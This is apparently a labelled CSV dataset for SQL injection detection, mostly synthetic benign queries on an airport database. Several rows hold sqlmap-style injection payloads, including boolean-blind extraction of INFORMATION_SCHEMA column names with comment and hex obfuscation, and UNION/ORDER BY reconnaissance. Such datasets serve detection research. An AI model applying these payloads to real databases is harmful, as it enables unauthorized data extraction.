full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SDNC"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""KU7"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Pinangsori Airport"", ""%"");",0,SDNC KU7 Pinangsori Airport,,,,select,airport-S17,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""PA79"",""small_airport"", ""Fort McMurray / Mildred Lake Airport"",""https://en.wikipedia.org/wiki/Cascais_Aerodrome"",""SA"")",0,PA79 small_airport Fort McMurray / Mildred Lake Airport https://en.wikipedia.org/wiki/Cascais_Aerodrome SA,,,,insert,airport-I3,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Warroad_International_Memorial_Airport"" WHERE ident = ""JP-1486""",0,https://en.wikipedia.org/wiki/Warroad_International_Memorial_Airport JP-1486,,,,update,airport-U3,,,test
"SELECT id FROM airports WHERE latitude <= 37.521558 AND continent LIKE ""EU""",0,37.521558 EU,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.13 AND  133.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.45  AND  126.8  ORDER BY frequency;",0,132.13 133.5 128.45 126.8,,,,select,airport-S13,,,test
"DELETE FROM airport WHERE ident=""EBRO"";",0,EBRO,,,,delete,airport-D1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1710.0 AND 73.0",0,1710.0 73.0,,,,select,airport-S2,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""RU"", ""Uzbekistan"", ""AS"", ""مطارات سوريا"")",0,RU Uzbekistan AS مطارات سوريا,,,,insert,airport-I6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"DELETE FROM runways WHERE airport_ident = ""5TS8"";",0,5TS8,,,,delete,airport-D5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,PM 5,,,,select,airport-S19,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Atyrau International Airport"");",0,Atyrau International Airport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""IL"", ""Lebanon"", ""AS"", ""Barbadan airports"")",0,IL Lebanon AS Barbadan airports,,,,insert,airport-I6,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WW26)HAVING5591=7124--ODsa"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WW26)HAVING5591=7124--ODsa"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WW26)HAVING5591=7124--ODsa"", ""%"");",1, WW26)HAVING5591=7124--ODsa WW26)HAVING5591=7124--ODsa WW26)HAVING5591=7124--ODsa ,recon,space2mysqlblank,failure,select,airport-S17,boolean-240,boolean,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""CG"", ""Burkina Faso"", ""EU"", ""Airports in Moldova"")",0,CG Burkina Faso EU Airports in Moldova,,,,insert,airport-I6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IN""",0,IN,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SWWK"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Milne Bay Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Bulgarian airports"", ""%"");",0,SWWK Airports in Milne Bay Province Bulgarian airports,,,,select,airport-S18,,,test
"SELECT id FROM airports WHERE iso_country LIKE ""MX"" AND name LIKE ""%zC82PEfh78AVtUK8W17p%"" AND elevation_feet <= 300.0 AND scheduled_service = ""no"" AND latitude BETWEEN 45.211399 AND -20.732200622558597 AND longitude <= -112.08000183105 AND type IN (""closed"",""closed"")",0,MX zC82PEfh78AVtUK8W17p 300.0 no 45.211399 -20.732200622558597 -112.08000183105 closed closed,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 119.275 AND  24.02  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.35  AND  118.3  ORDER BY frequency;",0,119.275 24.02 118.35 118.3,,,,select,airport-S13,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""BR""",0,BR,,,,select,airport-S6,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""REG In Salah Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,REG In Salah Airport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1939"" AS SIGNED) AND a.iso_country = ""AT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1939 AT,,,,select,airport-S22,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""3GA7"") OR name LIKE ""Holbaek, Holbæk Flyveplads""",0,"3GA7 Holbaek, Holbæk Flyveplads",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IQ"" GROUP BY r.name ORDER BY r.name ASC;",0,IQ,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Aiwo"";",0,Aiwo,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE continent = ""OC"" AND iso_region LIKE ""JP-17""",0,OC JP-17,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 874.0 AND 2796.0",0,874.0 2796.0,,,,select,airport-S2,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (59157, 3702, ""YMLD"", ""TWR"", ""CTAF"", 119.0)",0,59157 3702 YMLD TWR CTAF 119.0,,,,insert,airport-I8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(5147,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/17,1),1,1))>103)/**/THEN/**/5147/**/ELSE/**/0x3A/**/END)/**/AND/**/""gqdB""=""gqdB"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(5147,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/17,1),1,1))>103)/**/THEN/**/5147/**/ELSE/**/0x3A/**/END)/**/AND/**/""gqdB""=""gqdB Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""I39, Madison"") OR name LIKE ""Campo volo Il Laghetto""",0,"I39, Madison Campo volo Il Laghetto",,,,select,airport-S10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""IT-0323"", ""small_airport"", ""Yeysk Airport"", -35.288753, -54.246387481689)",0,IT-0323 small_airport Yeysk Airport -35.288753 -54.246387481689,,,,insert,airport-I1,,,test
"DELETE FROM airport WHERE ident=""MUHA"";",0,MUHA,,,,delete,airport-D1,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-1895"",""small_airport') AS uOlU WHERE 8673=8673 AND MAKE_SET/**/(1971=1971,6657)-- mynf"", ""Śniatowo Air Base"",""https://en.wikipedia.org/wiki/Abqaiq_Airport"",""SA"")",1," US-1895 small_airport') AS uOlU WHERE 8673=8673 AND MAKE_SET/**/(1971=1971,6657)-- mynf Śniatowo Air Base https://en.wikipedia.org/wiki/Abqaiq_Airport SA ",recon,commentbeforeparentheses,failure,insert,airport-I3,boolean-12,boolean,test
GRANT ALL ON mysql.* TO 'mysql'@'localhost' WITH GRANT OPTION;,0,,,,,admin,airport-admin7,,,test
"DELETE FROM regions WHERE name = ""Turnisce"";",0,Turnisce,,,,delete,airport-D8,,,test
"SELECT * FROM airport WHERE icao_code = 'UKKK' AND 6732 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),13,1))>105) THEN 6732 ELSE (SELECT 9758 UNION SELECT 3204) END))-- -';",1," UKKK' AND 6732 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),13,1))>105) THEN 6732 ELSE (SELECT 9758 UNION SELECT 3204) END))-- - ",exploit,equaltolike,success,select,airport-S1,boolean-156,boolean,test
"SELECT * FROM airport WHERE gps_code = ""RK3D"" OR local_code = ""39FA""",0,RK3D 39FA,,,,select,airport-S4,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""São Pedro do Ivaí;""",0,São Pedro do Ivaí,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Přerov Air Base"" OR keywords LIKE ""Aeropuerto Nacional de Salto del Guaira"";  ",0,Přerov Air Base Aeropuerto Nacional de Salto del Guaira,,,,delete,airport-D3,,,test
"UPDATE airport SET name = ""Indian Hill Resort Airport"" WHERE ident = ""IN-0246""",0,Indian Hill Resort Airport IN-0246,,,,update,airport-U1,,,test
SELECT * FROM airport WHERE icao_code = 'KVTN';,0,KVTN,,,,select,airport-S1,,,train
"SELECT id FROM airports WHERE scheduled_service = ""no"" AND type = ""small_airport"" AND name LIKE ""%uWaMMG7ZGayfYpYX8B5p%""",0,no small_airport uWaMMG7ZGayfYpYX8B5p,,,,select,airport-S23,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AU-0580','US-9876','FBKW','MX-1955');",0,AU-0580 US-9876 FBKW MX-1955,,,,update,airport-U10,,,test
"DELETE FROM airport WHERE ident=""MO26"";",0,MO26,,,,delete,airport-D1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Arkansas Valley Regional Medical Center Heliport"");",0,Arkansas Valley Regional Medical Center Heliport,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SN"" GROUP BY r.name ORDER BY r.name ASC;",0,SN,,,,select,airport-S16,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""LT-0010"", ""small_airport"", ""Intertherm Durban Heliport"", 41.691399, 23.122964, 7546.0)",0,LT-0010 small_airport Intertherm Durban Heliport 41.691399 23.122964 7546.0,,,,insert,airport-I2,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ET"" OR c.name LIKE CONCAT(""%"", ""Malta"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > -2595')))/**/ORDER/**/BY/**/1--/**/- ORDER BY navaid_count DESC;",1, ET Malta -2595')))/**/ORDER/**/BY/**/1--/**/- ,recon,space2comment,success,select,airport-S20,union-254,union,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""KR""",0,KR,,,,select,airport-S9,,,test
SELECT * FROM airport WHERE icao_code = 'SKPR';,0,SKPR,,,,select,airport-S1,,,test
"SELECT id FROM airports WHERE elevation_feet <= 1562.0 AND longitude >= 9.224722 AND type IN (""heliport"",""small_airport"",""small_airport"")",0,1562.0 9.224722 heliport small_airport small_airport,,,,select,airport-S23,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1150.0",0,US 1150.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Cachoeira Airport"");",0,Fazenda Cachoeira Airport,,,,select,airport-S12,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""TH"" OR c.name LIKE CONCAT(""%"", ""Haiti'))   AS     rZBM   WHERE   5518=5518  ORDER    BY     1#"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",1, TH Haiti'))   AS     rZBM   WHERE   5518=5518  ORDER    BY     1# 5 ,recon,multiplespaces,success,select,airport-S20,union-254,union,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""SE-S"", ""New Providence"", ""EU"", ""LS"", ""https://en.wikipedia.org/wiki/Galaţi_County"", ""Airports in Dakhlet Nouadhibou Region"")",0,SE-S New Providence EU LS https://en.wikipedia.org/wiki/Galaţi_County Airports in Dakhlet Nouadhibou Region,,,,insert,airport-I4,,,test
"DELETE FROM airport WHERE name LIKE ""Fort Simpson (Great Slave No. 1) Heliport"" OR keywords LIKE ""JN4"";  ",0,Fort Simpson (Great Slave No. 1) Heliport JN4,,,,delete,airport-D3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Tambeiskoye Sever field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Tambeiskoye Sever field,,,,select,airport-S14,,,test
"UPDATE airport_frequencies SET description = ""Shell"" WHERE airport_ident = ""KMCF"";",0,Shell KMCF,,,,update,airport-U5,,,test
"INSERT INTO countries (code, name, continent) VALUES (""GP"", ""Brazil"", ""AF"")",0,GP Brazil AF,,,,insert,airport-I7,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,LA 4,,,,select,airport-S19,,,test
"UPDATE airport SET municipality = ""Edison"" WHERE iso_country = ""JP""",0,Edison JP,,,,update,airport-U2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DM"" GROUP BY r.name ORDER BY r.name ASC;",0,DM,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""DE"" OR c.name LIKE CONCAT(""%"", ""Tajikistan"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,DE Tajikistan 3,,,,select,airport-S20,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AR"" GROUP BY r.name ORDER BY r.name ASC;",0,AR,,,,select,airport-S5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""IT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,IT 4,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-9429"", ""small_airport"", ""C 331 Heliport"", 47.048301696777344, -47.04688, 732.0)",0,US-9429 small_airport C 331 Heliport 47.048301696777344 -47.04688 732.0,,,,insert,airport-I2,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""EH0015, Maastricht Universitair Medisch Centrum Heliport"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""RCAF, BCATP"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Boramae Hyundai Apartment"", ""%"");",0,"EH0015, Maastricht Universitair Medisch Centrum Heliport RCAF, BCATP Boramae Hyundai Apartment",,,,select,airport-S17,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IE""",0,IE,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SK-219"";",0,SK-219,,,,select,airport-S7,,,test
"DELETE FROM airport WHERE ident=""LFHM"";",0,LFHM,,,,delete,airport-D1,,,train
"UPDATE countries SET keywords = ""Andorran airports"" WHERE code = ""AS"";",0,Andorran airports AS,,,,update,airport-U8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 4872.0 AND 253.0",0,4872.0 253.0,,,,select,airport-S2,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Stuart Atkinson Municipal Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Stuart Atkinson Municipal Airport,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""EGHD, PLH"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Nigerien airports"", ""%"");",0,"EGHD, PLH Airports in (unassigned) Nigerien airports",,,,select,airport-S18,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (352551, 4346, ""EDNC"", ""COMD POST"", ""780-862-7450"", 122.1)",0,352551 4346 EDNC COMD POST 780-862-7450 122.1,,,,insert,airport-I8,,,test
"SELECT id FROM airports WHERE type IN (""heliport"",""small_airport"",""small_airport"") AND scheduled_service = ""no"" AND name LIKE ""%a8oC7MWW6qkl539hFMkG%"" AND municipality = ""Itarumã"" AND longitude <= 22.401796",0,heliport small_airport small_airport no a8oC7MWW6qkl539hFMkG Itarumã 22.401796,,,,select,airport-S23,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""TZ""",0,TZ,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-SP""",0,AS BR-SP,,,,select,airport-S8,,,test
"SELECT id FROM airports WHERE elevation_feet <= 847.0 AND scheduled_service LIKE ""no"" AND name LIKE ""%zra2x6GL0KKRRVVOsgas%"" AND longitude >= -43.43046",0,847.0 no zra2x6GL0KKRRVVOsgas -43.43046,,,,select,airport-S23,,,test
"SELECT * FROM airport WHERE gps_code = ""SVMW"" OR local_code = ""MG0509""",0,SVMW MG0509,,,,select,airport-S4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Navy Outlying Field Site X Heliport"");",0,Navy Outlying Field Site X Heliport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE gps_code = ""KBRG"" OR local_code = ""NY25""",0,KBRG NY25,,,,select,airport-S4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Entabeni Airstrip""",0,Entabeni Airstrip,,,,select,airport-S3,,,test
"UPDATE airport_frequencies SET frequency_mhz = 118.9 WHERE type = ""CTAF"";",0,118.9 CTAF,,,,update,airport-U6,,,test
"GRANT SELECT,INSERT,DELETE,UPDATE ON mysql.* TO 'admin'@'localhost';",0,,,,,admin,airport-admin9,,,test
SELECT * FROM airport WHERE icao_code = 'VDKK';,0,VDKK,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1501"" AS SIGNED) AND a.iso_country = ""GU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1501 GU,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""SV"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,SV 5,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Mar Carboneras"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WAMY, Pangtiku Airport"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Luque, Stroessner, Aeropuerto Internacional Silvio Pettirossi"", ""%"");",0,"Mar Carboneras WAMY, Pangtiku Airport Luque, Stroessner, Aeropuerto Internacional Silvio Pettirossi",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'KGLD';,0,KGLD,,,,select,airport-S1,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Blue Springs;""",0,Blue Springs,,,,select,airport-S21,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 7700.0 AND 509.0",0,7700.0 509.0,,,,select,airport-S2,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CZ""",0,CZ,,,,select,airport-S6,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Imo State"";",0,Imo State,,,,select,airport-S15,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 135.6 AND  34.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  123.6  AND  118.3  ORDER BY frequency;",0,135.6 34.5 123.6 118.3,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""AT3"") OR name LIKE ""Caloc-an""",0,AT3 Caloc-an,,,,select,airport-S10,,,test
"DELETE FROM countries WHERE code = ""TD"";",0,TD,,,,delete,airport-D7,,,test
"DELETE FROM airport WHERE ident=""US-1732"";",0,US-1732,,,,delete,airport-D1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1028.0 AND 9.0",0,1028.0 9.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""PL"") OR a.elevation_ft > 1000.0",0,PL 1000.0,,,,select,airport-S11,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Artigas Department"";",0,Artigas Department,,,,select,airport-S15,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (54153, 2501, ""YDRD"", ""UNIC"", ""KHAMA GND"", 128.96)",0,54153 2501 YDRD UNIC KHAMA GND 128.96,,,,insert,airport-I8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Lotte City Hotel Guro Heliport""",0,Lotte City Hotel Guro Heliport,,,,select,airport-S3,,,test
